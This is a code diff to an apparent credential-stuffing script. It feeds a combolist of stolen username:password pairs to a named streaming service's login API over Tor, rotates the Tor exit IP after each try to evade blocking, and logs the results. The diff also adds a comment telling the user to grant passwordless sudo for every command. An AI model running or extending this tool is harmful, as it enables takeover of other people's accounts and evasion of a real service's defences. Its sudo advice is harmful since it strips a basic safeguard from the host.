@@ -3,17 +3,21 @@ import time
 import subprocess, shlex
 from header import drawHeader as Look_Ma_No_Hands
 
+# sudo visudo
+# Edit at the bottom:
+# %sudo ALL=(ALL:ALL) NOPASSWD: ALL
+
 endpoint = 'https://www.britbox.co.uk/api/authorization?ff=idp%2Cldp%2Crpt&lang=en'
-users=[];passwords=[]; validlist=[];No=0
-a=0
+users=[];passwords=[]; accountList=[];No=0
+a=0;counter=0
 
 def ringAroundtheRosy():
 	
-	newip = shlex.split('killall -HUP tor')
+	newip = shlex.split('sudo killall -HUP tor')
 	subprocess.run((newip), stdout = subprocess.DEVNULL, shell = False)
 
 while True:
-
+	
 	Look_Ma_No_Hands()
 	combolist = input('Combolist (i.e. /home/user/combos): ')
 
@@ -33,9 +37,10 @@ while True:
 accounts.close()
 
 while a<len(users):
-
-	try:
+	if counter%5== 0 and counter !=0:
 		Look_Ma_No_Hands()
+	try:
+
 		with requests.session() as login:
 
 			tor = {'http':'socks5h://localhost:9050', 'https':'socks5h://localhost:9050'}
@@ -45,10 +50,27 @@ while a<len(users):
 		
 			print ("Trying Combo: "+users[No]+":"+passwords[No]+" ---> IP: "+ipaddress)		
 			ringAroundtheRosy()
+			
 			if 'could not be satisfied' in postResponse.text:
-				a=a; No=No
+				a=a; No=No; counter +=1
+				
+			elif 'failed' in postResponse.text:
+				accountList.append(users[No]+":"+passwords[No]+"---> Bad")
+				print(postResponse.text)
+				a +=1; No +=1
 			else:
 				print (postResponse.text)
 				a +=1; No +=1
+			
 	except:
 		print("Host unreachable")
+
+login.close()
+
+ctr=0
+with open ('end_result','w') as results:
+	while ctr < len(accountList):
+		results.write(accountList[ctr]+"\n")
+		ctr +=1
+results.close()
+	
